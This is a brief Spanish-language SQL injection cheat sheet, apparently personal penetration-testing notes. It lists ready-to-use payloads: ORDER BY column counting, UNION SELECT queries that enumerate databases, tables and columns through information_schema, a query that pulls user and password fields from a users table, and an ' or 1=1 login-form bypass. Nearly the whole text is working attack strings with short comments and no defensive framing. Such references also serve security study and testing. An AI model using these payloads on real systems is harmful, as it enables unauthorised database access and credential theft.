# SQL Injection

Ver numero de columnas

```
' ORDER BY 1 -- -
```

Introducir información una vez sabemos el numero de columnas que hay:

<pre><code>' union select 1,2-- -

' union select schema_name from information_schema.schemata limit 0,1 -- - 
  // listar todas las bases de datos existentes {con limit van mostrando las bases de datos 0,1 1º 1,1 2º y asi sucesivamente}
<strong>
</strong><strong>' union select group_concat(schema_name) from information_schema.schemata -- - 
</strong>  // listar todas las bases de datos en una linea

' union select group_concat(table_name) from information_schema.tables where table_schema='table'-- - 
// ver tablas de la base de datos

' union select group_concat(column_name) from information_schema.columns where table_schema='table' and table_name='table' limit 0,1-- -
// ver columnas de la tabla

union select group_concat(user,password) from users-- -
//Ver informacion de las columnas
</code></pre>

Validar en un formulario

```
' or 1=1-- -
```
